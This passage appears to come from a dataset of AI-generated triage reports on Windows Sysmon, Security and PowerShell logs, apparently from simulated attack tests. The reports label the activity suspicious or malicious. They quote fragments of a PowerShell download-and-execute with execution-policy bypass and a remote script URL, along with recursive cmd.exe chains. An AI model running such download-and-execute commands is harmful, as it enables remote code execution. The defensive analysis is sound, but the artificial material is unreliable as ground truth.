### Observations:

1. **Sysmon Logs:**
   - Several entries where processes such as `powershell.exe`, `wevtutil.exe`, `conhost.exe`, and `cmd.exe` were executed by the user `SERVER002\admin_test`. 
   - The processes `powershell.exe` and sequences of `cmd.exe` can be suspicious as they are often used for administrative tasks or when scripting is involved, but they could also be used maliciously.
   - The execution of `CMD.exe` with several pivots indicates possible scripting or batch file execution. The command lines involved include recursive cmd calls which can be used for persistence or obfuscation: `""cmd.exe"" /c cmd /r cmd<...`.
   
2. **Process Execution:**
   - The `sysmon` logs indicate a hierarchy where a process like `wsmprovhost.exe` initiated several subprocesses including `cmd.exe`, `calc.exe`, `whoami.exe`, and various `conhost.exe` processes.
   - The execution of `calc.exe` via a command line can sometimes be an indicator of a benign test, but when seen with multiple other cmd invocations, it could indicate testing malicious payload execution.

3. **Edge Update Events:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and other related Edge Update executable processes run under `NT AUTHORITY\SYSTEM`. Such events are typical during normal system operations or software updates.
   - The frequent launching of Edge components may simply be updating but could also potentially mask malicious activity, although no clear indicators of this are present.

4. **Security SP-P Log Entry:**
   - The `Software Protection Platform Service` entry seems benign. It's likely related to routine system checks or system protection tasks.

### Assessment:

- **BENIGN Indicators:** The logs contain many processes that are typical in regular operation, such as service updates and utility executions (`wevtutil.exe`, `Microsoft Edge Update` processes).
  
- **SUSPICIOUS Indicators:** The recursive command shell operations (`cmd.exe`, powershell) especially in temporary directories could indicate suspicious activity, particularly if paired with further signs of script automation or if hosted in non-standard locations. The command lines such as running batch scripts in temporary locations are more indicative of scripting, which could be part of an attack payload.

### Resolution:

- **SUSPICIOUS**: As the logs include potentially unusual process execution and command-line arguments that don't inherently indicate malicious activity but are out of the ordinary, a deeper investigation is warranted. This includes reviewing the full context of these scripts, any dropped files, or potential network connections initiated by these processes.

### Next Steps:

1. **Further Investigation:**
   - Conduct a detailed forensic analysis of the system, focusing on the command-line activity sequences.
   - Review any scripts or temporary files outlined in the command executions.

2. **Monitoring and Detection:**
   - Increase monitoring on this host for further suspicious activities.
   - Set up alerts for unusual or recursive command executions and PowerShell activities.

3. **Containment and Response:**
   - If further suspicious activity is confirmed, consider containment strategies such as isolating the machine for an in-depth examination.
   - Verify the legitimacy of scripts or potentially suspicious files executed in the logs.

By following these steps, any potential threat can be accurately identified and mitigated before it impacts the broader network or systems."
Powershell MsXml COM object - with prompt,"**Analysis of the Logs:**

1. **Security Log:**
   - The events with ID 4616 indicate time adjustments in the system, which may be legitimate or not depending on the context in which they happened. The time changes appear to be associated with svchost.exe, a legitimate Windows process. There are multiple timestamp discrepancies which could be of interest if relating to time-stomping activities, but there's no immediate sign of compromise in isolation.

2. **System Log:**
   - The logs indicate changes in the system time. These are recorded by Event ID 1 and 24, suggesting updates to the time via `svchost.exe` working in conjunction with time synchronization services. The appearance of synchronizing with a known NTP server `time.windows.com` doesn't immediately suggest malicious activity, but if unauthorized, it could be a red flag.

3. **Windows PowerShell Log:**
   - There is a PowerShell event (Event ID 600) showing invocation of `powershell.exe` with a command-line that attempts to bypass execution policies, runs without a profile, and downloads and executes a script from a remote URL (`https://raw.githubusercontent.com/file/file-file/master/files/data.001/src/test.ps1`). This behavior is highly suspicious and indicative of potentially malicious activities, such as remote code execution or payload delivery from an external source.

4. **Sysmon Log:**
   - Numerous Sysmon events relate to process creations (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `powershell.exe`). The execution of `powershell.exe` and the command-line activity double down on the suspicious activity noted in the PowerShell log. The use of `cmd.exe` to spawn PowerShell using `-exec bypass -noprofile` with the specific payload is considered a common technique in malicious operations to evade detection.

5. **Application Log:**
   - The entry from the Microsoft-Windows-Security-SPP provider is a standard system log entry and doesn't indicate anything malicious on its own.

**Assessment and Resolution:**

- The PowerShell activity using execution bypass and the retrieval of scripts from an external URL is highly characteristic of malicious behavior. While the timestamp modifications and other processes might in isolation seem benign or part of administrative tasks, their proximity to the PowerShell events warrants caution.

**Resolution: MALICIOUS**

**Guidance:**

- It is crucial to conduct a deeper investigation starting with identifying the intent and the content of the fetched script (`test.ps1`) from the external source. 
- Ensure to isolate the affected machine (Server002) immediately to prevent further spread or compromise.
- Review network connections and DNS queries during the timeframe for other anomalies or unauthorized accesses.
- Increase monitoring of PowerShell usage across the network and apply stricter restrictions via Group Policies.
- Engage with the incident response team to communicate findings and initiate incident containment and remediation procedures."
